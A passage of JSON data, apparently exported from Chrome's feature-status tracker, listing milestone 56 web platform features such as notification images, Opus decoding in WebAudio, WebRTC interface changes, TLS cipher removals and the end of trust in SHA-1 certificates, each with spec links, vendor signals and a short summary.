        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/658313",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow preloading metadata over cellular connection unless some restrictions apply such as Data Saver being enabled.",
    "id": 5637973244641280,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:37.494160",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification image",
    "tags": [
      "notification",
      "image",
      "bigpicturestyle",
      "heroimage",
      "bigpicture"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://notifications.spec.whatwg.org/#image-resource",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/pull/82",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "johnme@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/614456",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Allows developers to show a large image as part of the content of a notification (whereas the existing `icon` and `badge` properties tend to be icons and are rendered smaller).\r\n\r\nScreenshot: http://i.imgur.com/fNf97ro.png",
    "id": 5190797599178752,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/showNotification",
        "https://developer.mozilla.org/en-US/docs/Web/API/notification",
        "https://developer.mozilla.org/en-US/docs/Web/API/notification/Notification"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/#image=1"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:46.793440",
      "by": "ericbidelman@google.com"
    },
    "name": "OPUS codec support in WebAudio's decodeAudioData() API.",
    "tags": [
      "Opus",
      "WebAudio",
      "decodeAudioData"
    ],
    "comments": "We've long supported OPUS in <audio>, but due to technical complexity hadn't extended support to WebAudio previously. As of M56, OPUS can be used in decodeAudioData().",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://opus-codec.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/HTML/Supported_media_formats",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "dalecurtis@chromium.org",
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Internals>Media"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=482934",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2016/04/18/webm-vp9-and-opus-support-in-microsoft-edge/#6CFAuhqTr6BrwMOQ.97",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Extends support for OPUS to WebAudio's decodeAudioData() API.",
    "id": 5649634416394240,
    "resources": {
      "docs": [
        "http://opus-codec.org/",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext/decodeAudioData"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:55.727680",
      "by": "ericbidelman@google.com"
    },
    "name": "PaymentRequest.canMakePayment()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/browser-payment-api/#canmakepayment-method",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "rouslan@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/664619",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A method in PaymentRequest, canMakePayment(), that returns back a boolean indicating whether or not the user has the ability to make a payment at the time PaymentRequest.show() is called.",
    "id": 5702608073261056,
    "resources": {
      "samples": [
        "https://rsolomakhin.github.io/samples/paymentrequest/can-make-payment/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:02.785910",
      "by": "ericbidelman@google.com"
    },
    "name": "RSA-PSS for TLS",
    "tags": [
      "ssl",
      "tls"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-tls-tls13-15#section-4.2.2",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1280439",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "davidben@chromium.org",
          "nharper@chromium.org",
          "svaldez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=642416",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In preparation for TLS 1.3, ship RSA-PSS signature algorithms in our TLS implementation. This will improve the options available for signing with RSA keys in TLS 1.2 (aligning with QUIC and TLS 1.3) and, more importantly, pave the road for TLS 1.3 by ensuring the ecosystem can handle new signature algorithms.",
    "id": 5748550642171904,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:48.659450",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCConfiguration iceTransportPolicy member",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcconfiguration-dictionary",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/658423",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "RTCConfiguration is the type of the optional first argument to the RTCPeerConnection constructor. Previously only 'iceTransports' was supported, but now the standard 'iceTransportPolicy' will also be supported.",
    "id": 5660839247872000,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/RTCPeerConnection#RTCConfiguration_dictionary"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:39.097650",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCPeerConnection unprefixed interface",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcpeerconnection-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/658423",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This entry track exposing the unprefixed RTCPeerConnection. webkitRTCPeerConnection has been exposed for a long time, and removing it is not part of this entry.",
    "id": 5312661013135360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:45.331970",
      "by": "ericbidelman@google.com"
    },
    "name": "Referrer-Policy header",
    "tags": [
      "referrer",
      "referrer policy",
      "referer"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-referrer-policy/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1264164",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "estark@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/619228",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Referrer-Policy header allows pages to set a referrer policy by sending an HTTP response header.",
    "id": 5639972996513792,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-08 22:49:19.140860",
      "by": "mfoltz@google.com"
    },
    "name": "Remote Playback API",
    "tags": [
      "cast",
      "remote",
      "media"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/remote-playback/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "avayvod@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/578833",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=162971",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This specification defines an API extending the HTMLMediaElement that enables controlling remote playback of media from a web page.  In M56, this will work on Android only (desktop will report no devices available) with the desktop backend being added later.",
    "id": 5778318691401728,
    "resources": {
      "samples": [
        "https://beaufortfrancois.github.io/sandbox/media/remote-playback.html",
        "https://avayvod.github.io/remote-playback/test.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:01.745570",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove CBC-mode ECDSA ciphers in TLS",
    "tags": [
      "ssl",
      "tls",
      "cbc",
      "ecdsa"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/658341",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove ECDHE_ECDSA_WITH_AES_128_CBC_SHA and ECDHE_ECDSA_WITH_AES_256_CBC_SHA TLS cipher suites. TLS's CBC-mode construction is flawed, making it fragile and very difficult to implement securely. Although CBC-mode ciphers are still widely used with RSA, they are virtually nonexistent with ECDSA.",
    "id": 5740978103123968,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:59.798970",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove TLS 1.2 ECDSA with SHA-1 and SHA-512 signature algorithms",
    "tags": [
      "tls",
      "ecdsa"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tlswg.github.io/tls13-spec/#rfc.section.4.2.3",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/655318",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In most modes, TLS 1.2 uses a signature in the ServerKeyExchange message to prove ownership of the private key. (Note this is NOT related to SHA-1 certificates.) There is an extension, signature_algorithms, to negotiate which signature algorithms are acceptable. To reduce dependencies on SHA-1 and prepare for TLS 1.3's new ECDSA handling, we intend to remove ECDSA with SHA-1 and ECDSA with SHA-512, leaving only SHA-256 and SHA-384 for ECDSA.",
    "id": 5725838074970112,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:11.009060",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove case-insensitive matching for radio button group names",
    "tags": [
      "HTML",
      "Forms",
      "radio button"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#radio-button-group",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 56
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Forms>Radio"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/658749",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "\"Compatibility caseless\" had been applied to radio button group name matching.  The specification was updated so that case-sensitive matching is applied.\r\nhttps://github.com/whatwg/html/commit/6acdb2122298d2bb7bb839c0a61b4e1f9b0f9bc9\r\n",
    "id": 6165799291060224,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-02-14 21:59:41.004580",
      "by": "jmedley@google.com"
    },
    "name": "Rename RTCIceCandidateEvent to RTCPeerConnectionIceEvent and expose",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcpeerconnectioniceevent",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "lunalu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 56,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/659286",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This entry track renaming RTCIceCandidateEvent (implemented and shipped) to RTCPeerConnectionIceEvent and exposing RTCPeerConnectionIceEvent constructor. ",
    "id": 5685429277818880,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/API/RTCPeerConnectionIceEvent"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:12.302530",
      "by": "ericbidelman@google.com"
    },
    "name": "Render Unicode control characters",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-text/#white-space-processing",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-style/2014Oct/0259.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=530348",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-style/2014Oct/0259.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-style/2014Oct/0259.html",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently Chrome and other browsers do not render unicode control characters. This violates the unicode spec and the handling in other software. With this change non-white-space control characters will be rendered.",
    "id": 6232200047493120,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-18 15:24:29.985670",
      "by": "jmedley@google.com"
    },
    "name": "Shadow-piercing descendant combinator (>>>) in snapshot profile",
    "comments": "See also\r\nhttps://www.chromestatus.com/features/6750456638341120\r\nfor /deep/'s case.\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-scoping/#deep-combinator",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/csswg-drafts/issues/640#issuecomment-367293984",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 56
        },
        "owners": [
          "kochi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "ios": 56,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 56,
        "flag": true,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=829713",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/webcomponents/issues/78#issuecomment-366854017",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A shadow-piercing descendant combinator (>>>) is defined in https://drafts.csswg.org/css-scoping/#deep-combinator as a straightforward replacement for `/deep/` combinator (which was for Shadow DOM V0), with a restriction that it is only allowed for selectors in querySelector() (aka static profile, not in dynamic profile for styling).\r\n\r\nSee spec discussions:\r\nhttps://github.com/w3c/webcomponents/issues/78 (already closed)\r\nhttps://github.com/w3c/csswg-drafts/issues/640\r\n",
    "id": 5045542597951488,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:16.252870",
      "by": "ericbidelman@google.com"
    },
    "name": "Stop Trusting SHA-1 Certificates",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/security/2015/10/20/continuing-to-phase-out-sha-1-certificates/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "awhalley@chromium.org",
          "rsleevi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Internals>Network>Certificate"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/653691",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2016/04/29/sha1-deprecation-roadmap/#e7SU8BVL7jG6HUJu.97",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://support.apple.com/kb/PH21491?locale=en_US",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Protect Chrome users from attackers who might use the broken SHA-1 hash algorithm to obtain counterfeit website authentication certificates.",
    "id": 6601657605423104,
    "resources": {
      "docs": [
        "https://security.googleblog.com/2014/09/gradually-sunsetting-sha-1.html",
        "https://security.googleblog.com/2015/12/an-update-on-sha-1-certificates-in.html",
        "https://sites.google.com/a/chromium.org/dev/Home/chromium-security/education/tls/sha-1"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:49.827180",
      "by": "ericbidelman@google.com"
    },
    "name": "Stop re-signaling a slotchange event.",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=660777",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The spec change: https://github.com/whatwg/dom/pull/353 (PR to DOM Standard)\r\n\r\nBlink no longer re-fires a slotchange event at a slot's assignedSlot (or parent slot).\r\nSee https://github.com/w3c/webcomponents/issues/571 for details.\r\n",
    "id": 5666302446272512,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:00.453940",
      "by": "ericbidelman@google.com"
    },
    "name": "Supporting chrome_settings_overrides API on OS X",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "jawag@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "platform>extensions>API"
        ],
        "desktop": 56,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=610545",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The API is currently only available on Windows. This change will enable it on OS X as well",
    "id": 5731798751379456,
    "resources": {
      "docs": [
        "https://developer.chrome.com/extensions/settings_override"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:45.478220",
      "by": "ericbidelman@google.com"
    },
    "name": "Throttle the rendering pipeline during page load when there's pending sheets.\t",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "esprehn@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/663193",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Delay running the rendering pipeline (style, layout, paint) and executing requestAnimationFrame callbacks inside iframes until pending stylesheets have finished loading.",
    "id": 5640551701413888,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1waQggCtPb44gwTp8PK5iz4B-YTiSOSBqbqtbopNrxNA/edit"
      ],
      "samples": [
        "https://www.elliottsprehn.com/examples/iframe-fouc-raf/?delay=500"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:50.594880",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch-action: pinch-zoom CSS property",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/pointerevents/pull/99",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/29#issuecomment-249192690",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
